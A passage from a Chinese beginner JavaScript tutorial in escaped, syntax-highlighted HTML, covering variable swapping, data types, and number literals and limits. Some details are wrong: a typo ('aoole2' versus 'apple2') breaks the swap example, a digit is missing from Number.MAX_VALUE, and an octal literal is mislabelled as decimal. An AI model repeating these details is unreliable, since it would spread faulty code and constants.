&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;apple1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;青苹果&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aoole2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;红苹果&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;temp&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;apple1&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 把右边给左边
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;apple1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;apple2&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;apple2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;temp&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;apple1&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;apple2&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;

	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;36-小结&#34;&gt;3.6 小结&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;为什么需要变量？
&lt;ul&gt;
&lt;li&gt;因为我们一些数据需要保存，所以需要变量&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;变量是什么？
&lt;ul&gt;
&lt;li&gt;变量就是一个容器，用来存放数据的。方便我们以后使用里面的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;变量的本质是什么？
&lt;ul&gt;
&lt;li&gt;变量是内存里的一块空间，用来存储数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;变量怎么使用的？
&lt;ul&gt;
&lt;li&gt;我们使用变量的时候，一定要声明变量，然后赋值&lt;/li&gt;
&lt;li&gt;声明变量本质是去内存申请空间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;什么是变量的初始化？
&lt;ul&gt;
&lt;li&gt;声明变量并赋值我们称之为变量的初始化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;变量命名规范有哪些？
&lt;ul&gt;
&lt;li&gt;变量名尽量要规范，见名知意——驼峰命名法&lt;/li&gt;
&lt;li&gt;区分哪些变量名不合法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;变换2个变量值的思路？
&lt;ul&gt;
&lt;li&gt;学会交换2个变量&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;4-数据类型&#34;&gt;4. 数据类型&lt;/h1&gt;
&lt;h2 id=&#34;本节目标-1&#34;&gt;本节目标&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;能够说出5种简单数据类型&lt;/li&gt;
&lt;li&gt;能够使用typeof获取变量的类型&lt;/li&gt;
&lt;li&gt;能够说出1~2种转换为数值型的方法&lt;/li&gt;
&lt;li&gt;能够说出1~2种转换为字符型的方法&lt;/li&gt;
&lt;li&gt;能够说出什么是隐式转换&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;本节目的&#34;&gt;本节目的&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;数据类型简介&lt;/li&gt;
&lt;li&gt;简单数据类型&lt;/li&gt;
&lt;li&gt;获取变量数据类型&lt;/li&gt;
&lt;li&gt;数据类型转换&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;41-数据类型简介&#34;&gt;4.1 数据类型简介&lt;/h2&gt;
&lt;h3 id=&#34;411-为什么需要数据类型&#34;&gt;4.1.1 为什么需要数据类型&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在计算机中，不同的数据所需占用的存储空间是不同的，为了便于把数据分成所需内存大小不同的数据，充分利用存储空间，于是定义了不同的数据类型。&lt;/li&gt;
&lt;li&gt;简单来说，数据类型就是数据的类别型号。比如姓名“张三”，年龄18，这些数据的类型是不一样的。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;412-变量的数据类型&#34;&gt;4.1.2 变量的数据类型&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;变量是用来存储值的所在处，它们有名字和数据类型。变量的数据类型决定了如何将代表这些值的位存储到计算机的内存中。JavaScript是一种弱类型或者说动态语言。这意味着不用提前声明变量的类型，在程序运行过程中，类型会被自动确定。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;			 &lt;span style=&#34;color:#75715e&#34;&gt;// 这是一个数字型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;areYouOk&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;是的&amp;#39;&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 这是一个字符串
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;在代码运行时，变量的数据类型是由JS引擎根据=右边变量值的数据类型来判断的，运行完毕之后，变量就确定了数据类型。&lt;/li&gt;
&lt;li&gt;JavaScript拥有动态类型，同时也意味着相同的变量可用作不同的类型。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;;			&lt;span style=&#34;color:#75715e&#34;&gt;// x 为数字
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bill&amp;#34;&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// x 为字符串
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// int num = 10;	java
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 这里的num，我们是不确定属于哪种数据类型的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// num属于数字型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// js 的变量数据类型是只有程序在运行过程中，根据等号右边的值来确定的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// str 字符串型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// js 是动态语言，变量的数据类型是可以变化的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// x 是数字型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// x 是字符串型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;413-数据类型的分类&#34;&gt;4.1.3 数据类型的分类&lt;/h3&gt;
&lt;p&gt;JS把数据类型分为两类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;简单数据类型（Number，String，Boolean，Undefined，Null）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;复杂数据类型（object）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;42-简单数据类型&#34;&gt;4.2 简单数据类型&lt;/h2&gt;
&lt;h3 id=&#34;421-简单数据类型基本数据类型&#34;&gt;4.2.1 简单数据类型（基本数据类型）&lt;/h3&gt;
&lt;p&gt;JavaScript中的简单数据类型及其说明如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;简单数据类型&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;th&gt;默认值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Number&lt;/td&gt;
&lt;td&gt;数字型，包含整型值和浮点型值，如21、0.21&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Boolean&lt;/td&gt;
&lt;td&gt;布尔值类型，如true、false，等价于1和0&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;String&lt;/td&gt;
&lt;td&gt;字符串类型，如&amp;quot;张三&amp;rdquo;，注意咱们js里面，字符串都带引号&lt;/td&gt;
&lt;td&gt;&amp;quot;&amp;rdquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Undefined&lt;/td&gt;
&lt;td&gt;var a; 声明了变量a但是没有给值，此时 a = undefined&lt;/td&gt;
&lt;td&gt;undefined&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Null&lt;/td&gt;
&lt;td&gt;var a = null; 声明了变量a为空值&lt;/td&gt;
&lt;td&gt;null&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;422-数字型-number&#34;&gt;4.2.2 数字型 Number&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;JavaScript数字类型既可以用来保存整数值，也可以保存小数（浮点数）。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 整数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21.3747&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 小数
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4221-数字型进制&#34;&gt;4.2.2.1 数字型进制&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;最常见的进制有二进制、八进制、十进制、十六进制。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 八进制数字序列范围：0~7
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 对应十进制的7
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;019&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 对应十进制的19
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;08&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 对应十进制的8
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 2. 十六进制数字序列范围：0~9 以及 A~F
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;现阶段我们只需记住，在JS中八进制前面加0，十六进制前面加0x&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;4222-数字型范围&#34;&gt;4.2.2.2 数字型范围&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;JavaScript中数值的最大和最小值&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(Number.&lt;span style=&#34;color:#a6e22e&#34;&gt;MAX_VALUE&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 1.797631348623157e+308
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(Number.&lt;span style=&#34;color:#a6e22e&#34;&gt;MIN_VALUE&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 5e-324
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4223-数字型三个特殊值&#34;&gt;4.2.2.3 数字型三个特殊值&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;Infinity&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// Infinity
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Infinity&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// -Infinity
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;NaN&lt;/span&gt;);			&lt;span style=&#34;color:#75715e&#34;&gt;// NaN
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Infinity，代表无穷大，大于任何数值&lt;/li&gt;
&lt;li&gt;-Infinity，代表无穷小，小于任何数值&lt;/li&gt;
&lt;li&gt;NaN，Not a number，代表一个非数值&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// num 数字型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PI&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3.14&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// PI 数字型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 八进制 0 ~ 7	我们程序里面数字前面加0，表示八进制
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;010&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 010 八进制，转换为10进制，就是8
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;012&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 012 十进制，转换为10进制，就是10
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 十六进制 0 ~ 9 a ~ f #ffffff 数字的前面加0x，表示十六进制
